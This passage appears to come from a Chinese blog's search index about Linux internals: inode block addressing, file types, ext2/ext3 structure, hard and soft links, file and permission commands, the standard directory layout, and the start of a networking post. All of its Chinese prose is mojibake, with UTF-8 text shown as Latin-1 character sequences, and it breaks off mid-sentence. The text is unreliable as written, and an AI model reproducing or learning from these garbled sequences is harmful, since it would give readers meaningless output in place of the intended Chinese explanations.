Linux ç³»ç»Ÿåˆ©ç”¨åœ°å€è½¬æ¢è¿‡ç¨‹å°†é€»è¾‘æ–‡ä»¶ä¸­çš„å­—èŠ‚åç§»é‡è½¬æ¢æˆæ–‡ä»¶çš„ç‰©ç†å—å·ã€‚é¦–å…ˆï¼Œå°†å­—èŠ‚åç§»é‡è½¬æ¢æˆæ–‡ä»¶é€»è¾‘å—å·åŠå—å†…åç§»é‡ï¼Œç„¶åå°†é€»è¾‘å—å·è½¬æ¢æˆç‰©ç†å—å·ã€‚ ç›´æ¥åœ°å€ å½“æ–‡ä»¶é€»è¾‘ç›˜å—å·å°äº 12 æ—¶ï¼Œå°†é€»è¾‘å—å·è½¬æ¢æˆç‰©ç†å—å·çš„æ–¹æ³•æ˜¯å°†æ–‡ä»¶é€»è¾‘å—å·è½¬æ¢ä¸ºç´¢å¼•èŠ‚ç‚¹çš„åœ°å€é¡¹ä¸‹æ ‡ï¼Œç„¶åä»è¯¥åœ°å€é¡¹ä¸­å°±å¯ä»¥ç›´æ¥è·å¾—è¯¥æ–‡ä»¶çš„ç‰©ç†ç›˜å—å·ã€‚ é—´æ¥åœ°å€ å½“è®¡ç®—å‡ºçš„æ–‡ä»¶é€»è¾‘å—å·å¤§äºæˆ–ç­‰äº 12 è€Œå°äº 268 æ—¶ï¼Œé‡‡ç”¨ä¸€æ¬¡é—´æ¥åœ°å€æ–¹å¼ã€‚å°†é€»è¾‘å—å·è½¬æ¢ä¸ºç‰©ç†å—å·çš„æ–¹æ³•æ˜¯ä»ä¸€æ¬¡é—´æ¥é¡¹ä¸­å¾—åˆ°ä¸€çº§é—´æ¥çš„ç›˜å—å·ï¼Œæ ¹æ®è¯¥é—´æ¥å—çš„å†…å®¹è®¡ç®—ä¸€æ¬¡é—´æ¥å—ä¸­çš„åœ°å€ä¸‹æ ‡ï¼Œå³å°†æ–‡ä»¶çš„é€»è¾‘å—å·å‡å» 12 ï¼Œä»ç›¸åº”ä¸‹æ ‡çš„åœ°å€é¡¹ä¸­å¾—åˆ°ç‰©ç†å—å·ã€‚ 0x04 Linuxæ–‡ä»¶ç³»ç»Ÿ å’Œæ™®é€š Unix ç³»ç»Ÿæ„ä¹‰ï¼ŒLinux ä½¿ç”¨æ ‘çŠ¶çš„æ–‡ä»¶ç³»ç»Ÿã€‚æ¯ä¸ªç³»ç»Ÿéƒ½æœ‰ä¸€ä¸ªæ ¹ç›®å½•ï¼Œä»è¿™é‡Œå¼€å§‹å¯ä»¥éå†æ•´ä¸ªç³»ç»Ÿä¸­çš„æ‰€æœ‰æ–‡ä»¶ï¼ŒLinux æ–‡ä»¶ç³»ç»Ÿä¸­æ²¡æœ‰ç±»ä¼¼ Windows ç³»ç»Ÿä¸­çš„é©±åŠ¨å™¨å’Œç›˜ç¬¦çš„æ¦‚å¿µã€‚ 0x05 Linuxæ–‡ä»¶ç±»å‹ Linux ç³»ç»Ÿä¸‹çš„æ–‡ä»¶ç±»å‹ä¸»è¦æœ‰ï¼š æ™®é€šæ–‡ä»¶ï¼šC è¯­è¨€å…ƒä»£ç ã€SHELL è„šæœ¬ã€äºŒè¿›åˆ¶çš„å¯æ‰§è¡Œæ–‡ä»¶ç­‰ã€‚åˆ†ä¸ºçº¯æ–‡æœ¬å’ŒäºŒè¿›åˆ¶ã€‚ ç›®å½•æ–‡ä»¶ï¼šç›®å½•ï¼Œå­˜å‚¨æ–‡ä»¶çš„å”¯ä¸€åœ°æ–¹ã€‚ é“¾æ¥æ–‡ä»¶ï¼šæŒ‡å‘åŒä¸€ä¸ªæ–‡ä»¶æˆ–ç›®å½•çš„çš„æ–‡ä»¶ã€‚ ç‰¹æ®Šæ–‡ä»¶ï¼šä¸ç³»ç»Ÿå¤–è®¾ç›¸å…³çš„ï¼Œé€šå¸¸åœ¨/dev ä¸‹é¢ã€‚åˆ†ä¸ºå—è®¾å¤‡å’Œå­—ç¬¦è®¾å¤‡ã€‚ åœ¨ Linux ç³»ç»Ÿä¸‹å¯ä»¥åœ¨ç»ˆç«¯ä½¿ç”¨ ls â€“lã€fileã€stat å‡ ä¸ªå‘½ä»¤æ¥æŸ¥çœ‹æ–‡ä»¶çš„ç±»å‹ç­‰ç›¸å…³ä¿¡æ¯ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](b-Linux ç³»ç»Ÿæ–‡ä»¶ç®¡ç†/2.png) 0x06 Linux æ–‡ä»¶å­˜å‚¨ç»“æ„ Linux æ­£ç»Ÿçš„æ–‡ä»¶ç³»ç»Ÿ(å¦‚ ext2ã€ext3)ä¸€ä¸ªæ–‡ä»¶ç”±ç›®å½•é¡¹ã€inode å’Œæ•°æ®å—ç»„æˆã€‚ ç›®å½•é¡¹ï¼šåŒ…æ‹¬æ–‡ä»¶åå’Œ inode èŠ‚ç‚¹å·ã€‚ inodeï¼šåˆç§°æ–‡ä»¶ç´¢å¼•èŠ‚ç‚¹ï¼Œæ˜¯æ–‡ä»¶åŸºæœ¬ä¿¡æ¯çš„å­˜æ”¾åœ°å’Œæ•°æ®å—æŒ‡é’ˆå­˜æ”¾åœ°ã€‚ æ•°æ®å—ï¼šæ–‡ä»¶çš„å…·ä½“å†…å®¹å­˜æ”¾åœ°ã€‚ Linux æ­£ç»Ÿçš„æ–‡ä»¶ç³»ç»Ÿ(å¦‚ ext2ã€ext3 ç­‰)å°†ç¡¬ç›˜åˆ†åŒºæ—¶ä¼šåˆ’åˆ†å‡ºç›®å½•å—ã€inode Table åŒºå—å’Œ data block æ•°æ®åŒºåŸŸã€‚ä¸€ä¸ªæ–‡ä»¶ç”±ä¸€ä¸ªç›®å½•é¡¹ã€inode å’Œæ•°æ®åŒºåŸŸå—ç»„æˆã€‚Inode åŒ…å«æ–‡ä»¶çš„å±æ€§(å¦‚è¯»å†™å±æ€§ã€ownerç­‰ï¼Œä»¥åŠæŒ‡å‘æ•°æ®å—çš„æŒ‡é’ˆ)ï¼Œæ•°æ®åŒºåŸŸå—åˆ™æ˜¯æ–‡ä»¶å†…å®¹ã€‚å½“æŸ¥çœ‹æŸä¸ªæ–‡ä»¶æ—¶ï¼Œä¼šå…ˆä» inode table ä¸­æŸ¥å‡ºæ–‡ä»¶å±æ€§åŠæ•°æ®å­˜æ”¾ç‚¹ï¼Œå†ä»æ•°æ®å—ä¸­è¯»å–æ•°æ®ã€‚ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](b-Linux ç³»ç»Ÿæ–‡ä»¶ç®¡ç†/3.png) å…¶ä¸­ç›®å½•é¡¹çš„ç»“æ„å¦‚ä¸‹(æ¯ä¸ªæ–‡ä»¶çš„ç›®å½•é¡¹å­˜å‚¨åœ¨æ”¹æ–‡ä»¶æ‰€å±ç›®å½•çš„æ–‡ä»¶å†…å®¹é‡Œ)ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](b-Linux ç³»ç»Ÿæ–‡ä»¶ç®¡ç†/4.png) å…¶ä¸­æ–‡ä»¶çš„ inode ç»“æ„å¦‚ä¸‹ï¼ˆinode é‡Œæ‰€åŒ…å«çš„æ–‡ä»¶ä¿¡æ¯å¯ä»¥é€šè¿‡ stat filename æŸ¥çœ‹å¾—åˆ°ï¼‰ï¼š ![å›¾ç‰‡æè¿°](b-Linux ç³»ç»Ÿæ–‡ä»¶ç®¡ç†/5.png) ä»¥ä¸Šåªåæ˜ å¤§ä½“çš„ç»“æ„ï¼Œlinux æ–‡ä»¶ç³»ç»Ÿæœ¬èº«åœ¨ä¸æ–­å‘å±•ã€‚ä½†æ˜¯ä»¥ä¸Šæ¦‚å¿µåŸºæœ¬æ˜¯ä¸å˜çš„ã€‚ä¸”å¦‚ ext2ã€ext3ã€ext4 æ–‡ä»¶ç³»ç»Ÿä¹Ÿå­˜åœ¨å¾ˆå¤§å·®åˆ«ï¼Œå¦‚æœè¦äº†è§£å¯ä»¥æŸ¥çœ‹ä¸“é—¨çš„æ–‡ä»¶ç³»ç»Ÿä»‹ç»ã€‚ 0x07 è½¯è¿æ¥ã€ç¡¬é“¾æ¥ è½¯é“¾æ¥å’Œç¡¬é“¾æ¥æ˜¯æˆ‘ä»¬å¸¸è§çš„ä¸¤ç§æ¦‚å¿µï¼š ç¡¬é“¾æ¥ï¼šæ˜¯ç»™æ–‡ä»¶ä¸€ä¸ªå‰¯æœ¬ï¼ŒåŒæ—¶å»ºç«‹ä¸¤è€…ä¹‹é—´çš„é“¾æ¥å…³ç³»ã€‚ä¿®æ”¹å…¶ä¸­ä¸€ä¸ªï¼Œä¸å…¶é“¾æ¥çš„æ–‡ä»¶åŒæ—¶è¢«ä¿®æ”¹ã€‚å¦‚æœåˆ é™¤å…¶ä¸­ [color=red] ä»»æ„ä¸€ä¸ª [/color] å…¶ä½™çš„æ–‡ä»¶å°†ä¸å—å½±å“ã€‚ è½¯é“¾æ¥:ä¹Ÿå«ç¬¦å·é“¾æ¥,ä»–åªæ˜¯å¯¹æºæ–‡ä»¶åœ¨æ–°çš„ä½ç½®å»ºç«‹ä¸€ä¸ªâ€œå¿«æ·æ–¹å¼ï¼ˆå€Ÿç”¨ä¸€ä¸‹ wondows å¸¸ç”¨è¯ï¼‰â€ï¼Œæ‰€ä»¥ï¼Œå½“æºæ–‡ä»¶åˆ é™¤æ—¶ï¼Œç¬¦å·é“¾æ¥çš„æ–‡ä»¶å°†æˆä¸ºæ— æºä¹‹æ°´-&gt;ä»…ä»…å‰©ä¸‹ä¸ªæ–‡ä»¶åäº†ï¼Œå½“ç„¶åˆ é™¤è¿™ä¸ªé“¾æ¥ï¼Œä¹Ÿä¸ä¼šå½±å“åˆ°æºæ–‡ä»¶ï¼Œä½†å¯¹é“¾æ¥æ–‡ä»¶çš„ä½¿ç”¨ã€å¼•ç”¨éƒ½æ˜¯ç›´æ¥è°ƒç”¨æºæ–‡ä»¶çš„ã€‚ å…·ä½“å…³ç³»å¯ä»¥çœ‹ä¸‹å›¾ï¼š ![å›¾ç‰‡æè¿°](b-Linux ç³»ç»Ÿæ–‡ä»¶ç®¡ç†/8.png) ä»å›¾ä¸Šå¯ä»¥çœ‹å‡ºç¡¬é“¾æ¥å’Œè½¯é“¾æ¥çš„åŒºåˆ«ï¼š ç¡¬é“¾æ¥åŸæ–‡ä»¶å’Œæ–°æ–‡ä»¶çš„ inode ç¼–å·ä¸€è‡´ã€‚è€Œè½¯é“¾æ¥ä¸ä¸€æ ·ã€‚ å¯¹åŸæ–‡ä»¶åˆ é™¤ï¼Œä¼šå¯¼è‡´è½¯é“¾æ¥ä¸å¯ç”¨ï¼Œè€Œç¡¬é“¾æ¥ä¸å—å½±å“ã€‚ å¯¹åŸæ–‡ä»¶çš„ä¿®æ”¹ï¼Œè½¯ã€ç¡¬é“¾æ¥æ–‡ä»¶å†…å®¹ä¹Ÿä¸€æ ·çš„ä¿®æ”¹ï¼Œå› ä¸ºéƒ½æ˜¯æŒ‡å‘åŒä¸€ä¸ªæ–‡ä»¶å†…å®¹çš„ã€‚ 0x08 Linuxæ–‡ä»¶ç›®å½•ç®¡ç† ç£ç›˜å’Œæ–‡ä»¶ç©ºé—´ä½¿ç”¨å‘½ä»¤ï¼š ddï¼šæŠŠæŒ‡å®šçš„è¾“å…¥æ–‡ä»¶å¤åˆ¶åˆ°æŒ‡å®šçš„è¾“å‡ºæ–‡ä»¶ä¸­ï¼Œå¹¶ä¸”åœ¨å¤åˆ¶è¿‡ç¨‹ä¸­è¿›è¡Œæ ¼å¼è½¬æ¢ã€‚ fdiskï¼šåˆ›å»ºå’Œç»´æŠ¤åˆ†åŒºè¡¨çš„ç¨‹åºï¼Œå®ƒå…¼å®¹ DOS ç±»å‹çš„åˆ†åŒºè¡¨ã€BSD æˆ–è€… SUN ç±»å‹çš„ç£ç›˜åˆ—è¡¨ã€‚ dfï¼šå¯ä»¥æ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶ç³»ç»Ÿå¯¹ i èŠ‚ç‚¹å’Œç£ç›˜å—çš„ä½¿ç”¨æƒ…å†µ duï¼šè¯¥å‘½ä»¤é€çº§è¿›å…¥æŒ‡å®šç›®å½•çš„æ¯ä¸€ä¸ªå­ç›®å½•å¹¶æ˜¾ç¤ºè¯¥ç›®å½•å ç”¨æ–‡ä»¶ç³»ç»Ÿæ•°æ®å—( 1024 å­—èŠ‚)çš„æƒ…å†µã€‚ æ–‡ä»¶ç›®å½•ä¸ç®¡ç†ä½¿ç”¨å‘½ä»¤ï¼š cdï¼šæ”¹å˜å½“å‰å·¥ä½œç›®å½• pwdï¼šæ˜¾ç¤ºå½“å‰å·¥ä½œç›®å½•çš„å…¨è·¯å¾„å mkdirï¼šåˆ›å»ºç›®å½• rmdirï¼šåˆ é™¤ç›®å½• lsï¼šç”¨äºæ˜¾ç¤ºç›®å½•å†…å®¹ï¼Œç±»ä¼¼ DOS ä¸‹çš„ dir å‘½ä»¤ï¼Œå®ƒçš„ä½¿ç”¨æƒé™æ˜¯æ‰€æœ‰ç”¨æˆ· cpï¼šå¸¦ç›®å½•å¤åˆ¶ rmï¼šåˆ é™¤æ–‡ä»¶æˆ–ç›®å½• mvï¼šç›®å½•æ›´åæˆ–æ¬ç§» æŸ¥çœ‹æ–‡ä»¶å†…å®¹å‘½ä»¤ï¼š cat: cat [file] æŸ¥çœ‹æ–‡ä»¶çš„å†…å®¹ã€‚å…¨ç§°æ˜¯ concatenate çš„æ„æ€ï¼Œå°†æ–‡ä»¶å†…å®¹è¿ç»­è¾“å‡ºåˆ°å±å¹•ä¸Šã€‚ç¬¬ä¸€è¡Œåˆ°æœ€åä¸€è¡Œæ˜¾ç¤ºã€‚ tac: tac [file] å’Œ cat åˆšå¥½ç›¸å æ˜¯ä»æœ€åä¸€è¡Œåˆ°ç¬¬ä¸€è¡Œçš„æ–¹å¼æŸ¥çœ‹ã€‚ cat æœ‰ä¸ªæ¯”è¾ƒä¸å¥½çš„åœ°æ–¹æ—¶å½“æ–‡ä»¶æ¯”è¾ƒå¤§æ—¶å€™æ²¡åŠæ³•çœ‹æ¸…æ¥šï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ç”¨ more æˆ–è€… Less å‘½ä»¤ã€‚ more: more [file] å¦‚æœä½¿ç”¨ grep æˆ–è€… find ç­‰å‘½ä»¤æ—¶ï¼Œå¯ä»¥é…åˆä½¿ç”¨ more ä¸€é¡µä¸€é¡µçš„æŸ¥çœ‹ã€‚å¦‚æœçœ‹åˆ°ä¸€åŠæƒ³é€€å‡ºï¼Œåˆ™æ•²å…¥â€™qâ€™å³å¯é€€å‡ºã€‚ less: less [file] lessæ¯” more æ›´æœ‰å¼¹æ€§ï¼Œå¯ä»¥ä¸Šä¸‹ç¿»é¡µã€‚ å¦‚æœåªæƒ³è¯»å–æ–‡ä»¶çš„å¤´å‡ è¡Œæˆ–è€…æ–‡ä»¶çš„æœ«å°¾å‡ è¡Œï¼Œå¯ä»¥ç”¨ head æˆ– tail. head â€“n [file]ï¼šè¯»å–æ–‡ä»¶çš„å‰ n è¡Œã€‚ tail â€“n [file]ï¼šè¯»å–æ–‡ä»¶æœ«å°¾ n è¡Œã€‚ ä»¥ä¸Šå‘½ä»¤éƒ½æ˜¯ç”¨äºæŸ¥çœ‹å­—ç¬¦æ–‡ä»¶ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶å‡ºæ¥çš„éƒ½æ˜¯ä¹±ç ï¼Œè¦çœ‹äºŒè¿›åˆ¶æ–‡ä»¶çš„å†…å®¹ï¼Œå¯ä»¥ç”¨ od å‘½ä»¤,å¦‚æŸ¥çœ‹ä¸€ä¸ª MP3 æ–‡ä»¶é‡Œé¢çš„å†…å®¹: od shijiemori.mp3 æ–‡ä»¶ç›®å½•ä¸æƒé™å‘½ä»¤ï¼š chmodï¼šä¿®æ”¹æ–‡ä»¶æˆ–ç›®å½•çš„å­˜å–æƒé™ chownï¼šæ”¹å˜æ–‡ä»¶æ‹¥æœ‰è€… chgrpï¼šæ”¹å˜æ–‡ä»¶çš„æ‰€å±ç»„ umaskï¼šç”¨æ¥è®¾å®š[æƒé™æ©ç ]ã€‚[æƒé™æ©ç ]æ˜¯ç”± 3 ä¸ªå…«è¿›åˆ¶çš„æ•°å­—æ‰€ç»„æˆï¼Œå°†ç°æœ‰çš„å­˜å–æƒé™å‡æ‰æƒé™æ©ç åï¼Œå³å¯äº§ç”Ÿå»ºç«‹æ–‡ä»¶æ—¶é¢„è®¾çš„æƒé™ã€‚ æ–‡ä»¶æŸ¥æ‰¾å‘½ä»¤ï¼š which: which [filename] è¯¥å‘½ä»¤ç”¨äºæŸ¥è¯¢é€šè¿‡ PATH è·¯å¾„åˆ°è¯¥è·¯å¾„å†…æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ã€‚å¦‚ï¼šWhich passwd:æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶ passwd whereis: whereis [-bmsu] [keyword] è¯¥å‘½ä»¤ç”¨äºæŠŠç›¸å…³å­—çš„æ–‡ä»¶å’Œç›®å½•éƒ½åˆ—å‡ºæ¥ã€‚(Linux ä¼šå°†æ–‡ä»¶éƒ½è®°å½•åœ¨ä¸€ä¸ªæ–‡ä»¶æ•°æ®åº“é‡Œé¢ï¼Œè¯¥å‘½ä»¤å¼ä»æ•°æ®åº“å»æŸ¥è¯¢ï¼Œæ‰€ä»¥é€Ÿåº¦æ¯”è¾ƒå¿«,Linux æ¯å¤©ä¼šæ›´æ–°è¯¥æ•°æ®åº“) locate: locate [filename] è¯¥å‘½ä»¤ç”¨äºæŠŠç›¸å…³å­—çš„æ–‡ä»¶å’Œç›®å½•éƒ½åˆ—å‡ºæ¥ã€‚æŸ¥æ‰¾æ•°æ®ç‰¹åˆ«å¿«ï¼Œä¹Ÿæ˜¯é€šè¿‡æ•°æ®åº“æ–¹å¼æ¥æŸ¥è¯¢ã€‚ä½†æ˜¯æ•°æ®åº“ä¸€å‘¨æ›´æ–°ä¸€æ¬¡ï¼Œæ‰€ä»¥å¯èƒ½æœ‰äº›å­˜åœ¨æ•°æ®æŸ¥ä¸åˆ°ã€‚å¯ä»¥å»ä¿®æ”¹é…ç½®æ–‡ä»¶ã€‚ find: find [path] [å‚æ•°] [keyword] è¯¥å‘½ä»¤ç”¨äºåœ¨æŒ‡å®šè·¯å¾„ä¸‹æŸ¥æ‰¾æ–‡ä»¶ã€‚ä¸æ˜¯é€šè¿‡æ•°æ®æ¥æŸ¥è¯¢ï¼Œæ‰€ä»¥é€Ÿåº¦ä¼šæ¯”è¾ƒæ…¢ã€‚ 0x09 Linuxæ–‡ä»¶ç³»ç»Ÿå¸¸è§ç›®å½•æè¿° Linux å„ç§å‘è¡Œç‰ˆçš„ç›®å½•ç»“æ„åŸºæœ¬ä¸€è‡´ï¼Œå„ä¸ªç›®å½•ç®€å•ä»‹ç»å¦‚ä¸‹ï¼š ç›®å½• æè¿° / æ ¹ç›®å½• /bin åšä¸ºåŸºç¡€ç³»ç»Ÿæ‰€éœ€è¦çš„æœ€åŸºç¡€çš„å‘½ä»¤å°±æ˜¯æ”¾åœ¨è¿™é‡Œã€‚æ¯”å¦‚ lsã€cpã€mkdir ç­‰å‘½ä»¤ï¼›åŠŸèƒ½å’Œ/usr/bin ç±»ä¼¼ï¼Œè¿™ä¸ªç›®å½•ä¸­çš„æ–‡ä»¶éƒ½æ˜¯å¯æ‰§è¡Œçš„ï¼Œæ™®é€šç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨çš„å‘½ä»¤ã€‚ /boot Linux çš„å†…æ ¸åŠå¼•å¯¼ç³»ç»Ÿç¨‹åºæ‰€éœ€è¦çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ vmlinuz initrd.img æ–‡ä»¶éƒ½ä½äºè¿™ä¸ªç›®å½•ä¸­ã€‚åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒGRUB æˆ– LILO ç³»ç»Ÿå¼•å¯¼ç®¡ç†å™¨ä¹Ÿä½äºè¿™ä¸ªç›®å½•ï¼›å¯åŠ¨è£…è½½æ–‡ä»¶å­˜æ”¾ä½ç½®ï¼Œå¦‚ kernels,initrd,grubã€‚ä¸€èˆ¬æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„åˆ†åŒºã€‚ /dev ä¸€äº›å¿…è¦çš„è®¾å¤‡,å£°å¡ã€ç£ç›˜ç­‰ã€‚è¿˜æœ‰å¦‚ /dev/null. /dev/console /dev/zero /dev/full ç­‰ã€‚ /etc ç³»ç»Ÿçš„é…ç½®æ–‡ä»¶å­˜æ”¾åœ°. ä¸€äº›æœåŠ¡å™¨çš„é…ç½®æ–‡ä»¶ä¹Ÿåœ¨è¿™é‡Œï¼›æ¯”å¦‚ç”¨æˆ·å¸å·åŠå¯†ç é…ç½®æ–‡ä»¶ï¼›/etc/opt:/opt å¯¹åº”çš„é…ç½®æ–‡ä»¶ï¼›/etc/X11:Xwindows ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼›/etc/xml:XML é…ç½®æ–‡ä»¶ï¼›â€¦â€¦ /home ç”¨æˆ·å·¥ä½œç›®å½•ï¼Œå’Œä¸ªäººé…ç½®æ–‡ä»¶ï¼Œå¦‚ä¸ªäººç¯å¢ƒå˜é‡ç­‰ï¼Œæ‰€æœ‰çš„è´¦å·åˆ†é…ä¸€ä¸ªå·¥ä½œç›®å½•ã€‚ä¸€èˆ¬æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„åˆ†åŒºã€‚ /lib åº“æ–‡ä»¶å­˜æ”¾åœ°ã€‚bin å’Œ sbin éœ€è¦çš„åº“æ–‡ä»¶ã€‚ç±»ä¼¼ windows çš„ DLLã€‚ /media å¯æ‹†å¸çš„åª’ä»‹æŒ‚è½½ç‚¹ï¼Œå¦‚ CD-ROMsã€ç§»åŠ¨ç¡¬ç›˜ã€U ç›˜ï¼Œç³»ç»Ÿé»˜è®¤ä¼šæŒ‚è½½åˆ°è¿™é‡Œæ¥ã€‚ /mnt ä¸´æ—¶æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿã€‚è¿™ä¸ªç›®å½•ä¸€èˆ¬æ˜¯ç”¨äºå­˜æ”¾æŒ‚è½½å‚¨å­˜è®¾å¤‡çš„æŒ‚è½½ç›®å½•çš„ï¼Œæ¯”å¦‚æœ‰ cdrom ç­‰ç›®å½•ã€‚å¯ä»¥å‚çœ‹ /etc/fstab çš„å®šä¹‰ã€‚ /opt å¯é€‰çš„åº”ç”¨ç¨‹åºåŒ…ã€‚ /proc æ“ä½œç³»ç»Ÿè¿è¡Œæ—¶ï¼Œè¿›ç¨‹ï¼ˆæ­£åœ¨è¿è¡Œä¸­çš„ç¨‹åºï¼‰ä¿¡æ¯åŠå†…æ ¸ä¿¡æ¯ï¼ˆæ¯”å¦‚ cpuã€ç¡¬ç›˜åˆ†åŒºã€å†…å­˜ä¿¡æ¯ç­‰ï¼‰å­˜æ”¾åœ¨è¿™é‡Œã€‚/proc ç›®å½•ä¼ªè£…çš„æ–‡ä»¶ç³»ç»Ÿ proc çš„æŒ‚è½½ç›®å½•ï¼Œproc å¹¶ä¸æ˜¯çœŸæ­£çš„æ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒçš„å®šä¹‰å¯ä»¥å‚è§ /etc/fstab ã€‚ /root Root ç”¨æˆ·çš„å·¥ä½œç›®å½• /sbin å’Œ bin ç±»ä¼¼ï¼Œæ˜¯ä¸€äº›å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¸è¿‡ä¸æ˜¯æ‰€æœ‰ç”¨æˆ·éƒ½éœ€è¦çš„ï¼Œä¸€èˆ¬æ˜¯ç³»ç»Ÿç®¡ç†æ‰€éœ€è¦ä½¿ç”¨å¾—åˆ°çš„ã€‚ /tmp ç³»ç»Ÿçš„ä¸´æ—¶æ–‡ä»¶ï¼Œä¸€èˆ¬ç³»ç»Ÿé‡å¯ä¸ä¼šè¢«ä¿å­˜ã€‚ /usr åŒ…å«äº†ç³»ç»Ÿç”¨æˆ·å·¥å…·å’Œç¨‹åºã€‚/usr/binï¼šéå¿…é¡»çš„æ™®é€šç”¨æˆ·å¯æ‰§è¡Œå‘½ä»¤ï¼›/usr/includeï¼šæ ‡å‡†å¤´æ–‡ä»¶ï¼› /usr/lib:/usr/bin/ å’Œ /usr/sbin/çš„åº“æ–‡ä»¶ï¼› /usr/sbin:éå¿…é¡»çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼›/usr/src:å†…æ ¸æºç ï¼›/usr/X11R6:X Window System, Version 11, Release 6. /srv è¯¥ç›®å½•å­˜æ”¾ä¸€äº›æœåŠ¡å¯åŠ¨ä¹‹åéœ€è¦æå–çš„æ•°æ®","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","slug":"A-OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"ã€åŸç†å‰–æã€‘d-Linux ç½‘ç»œåŸºç¡€.md","date":"2023-12-26T16:00:00.000Z","path":"A_OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ/ã€åŸç†å‰–æã€‘d-Linux ç½‘ç»œåŸºç¡€/","text":"æ¦‚è¿°ï¼šLinux æ“ä½œç³»ç»Ÿå®é™…ä¸Šæ˜¯ä¸€ä¸ªç½‘ç»œæ“ä½œç³»ç»Ÿï¼Œç³»ç»Ÿç®¡ç†çš„å¾ˆå¤§éƒ¨åˆ†å·¥ä½œå…¶å®éƒ½å’Œç½‘ç»œæœ‰å…³ã€‚ TCP/IP åè®® Linux ç½‘ç»œé…ç½® åŸºæœ¬ç½‘ç»œæœåŠ¡ ç½‘ç»œå®‰å…¨ Linux ä¸‹ç½‘ç»œé€šä¿¡åŸºæœ¬æµç¨‹å’Œæ“ä½œ 0x01 TCP/IP åè®® åœ¨ä¿¡æ¯åŒ–è®¾å¤‡ä¸­ï¼ŒåŠåˆ·æœºå·²ç»ä»å•ä¸€ä½¿ç”¨å‘å±•åˆ°äº†é›†ç¾¤ä½¿ç”¨ã€‚è¶Šæ¥è¶Šå¤šçš„åº”ç”¨é¢†åŸŸéœ€è¦è®¡ç®—æœºåœ¨ä¸€å®šçš„åœ°ç†èŒƒå›´å†…è”åˆèµ·æ¥è¿›è¡Œé›†ç¾¤å·¥ä½œï¼Œä»è€Œä¿ƒè¿›äº†è®¡ç®—æœºå’Œé€šä¿¡æŠ€æœ¯çš„ç´§å¯†ç»“åˆï¼Œå½¢æˆäº†è®¡ç®—æœºç½‘ç»œã€‚ åœ¨è®¡ç®—æœºç½‘ç»œä¸­ï¼Œä¸ºäº†å®ç°è®¡ç®—æœºä¹‹é—´çš„ç›¸äº’é€šä¿¡ï¼Œæœ‰è®¸å¤šä¸åŒçš„é€šä¿¡è§„ç¨‹å’Œçº¦å®šï¼Œè¿™äº›è§„ç¨‹å’Œçº¦å®šå°±æ˜¯è®¡ç®—æœºç½‘ç»œåè®®ã€‚è¿™å°±è¦æ±‚ä¸åŒçš„è®¡ç®—æœºå‚å•†åœ¨å¼€å‘å’Œç ”åˆ¶è‡ªå·±çš„ç½‘ç»œç³»ç»Ÿæ—¶éœ€è¦éµå¾ªä¸€ä¸ªç»Ÿä¸€çš„çº¦å®šã€‚ç½‘ç»œæ ‡å‡†åŒ–ç»„ç»‡åœ¨ 1981 å¹´é¢å¸ƒäº†å¼€æ”¾ç³»ç»Ÿäº’è”å‚è€ƒæ¨¡å‹ï¼Œå³ ISO/OSI æ¨¡å‹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œç°åœ¨å¤§éƒ¨åˆ†ç½‘ç»œåè®®éƒ½æ˜¯å‚è€ƒè¿™æ ‡å‡†è®¾è®¡çš„ã€‚ ![å›¾ç‰‡æè¿°](d-Linux ç½‘ç»œåŸºç¡€/1.png) TCP/IP äº 20 ä¸–çºª 70 å¹´ä»£å¼€å§‹ç ”ç©¶å’Œå¼€å‘ï¼Œç°åœ¨ä¹Ÿå¹¿æ³›ç”¨äºå„ç§ç½‘ç»œä¸­ï¼Œä¸è®ºæ˜¯å±€åŸŸç½‘è¿˜æ˜¯å¹¿åŸŸç½‘éƒ½å¯ä»¥ç”¨ TCP/IP åè®®æ¥æ„é€ ç½‘ç»œç¯å¢ƒã€‚åŒæ—¶ TCP/IP åè®®ä¹Ÿæ˜¯ Unixã€Linux ç­‰æ“ä½œç³»ç»Ÿä¸­æœ€é‡è¦çš„ç½‘ç»œåè®®ã€‚ä»¥ TCP/IP ä¸ºæ ¸å¿ƒåè®®çš„ Internet æ›´åŠ ä¿ƒè¿›äº† TCP/IP çš„åº”ç”¨å’Œå‘å±•ã€‚ ä»ä½“ç³»ç»“æ„ä¸Šæ¥çœ‹ï¼Œ TCP/IP åè®®æ˜¯ OSI å‚è€ƒæ¨¡å‹ä¸ƒå±‚ç»“æ„çš„ç®€åŒ–ï¼Œå®ƒåªæœ‰åº”ç”¨å±‚ã€ä¼ 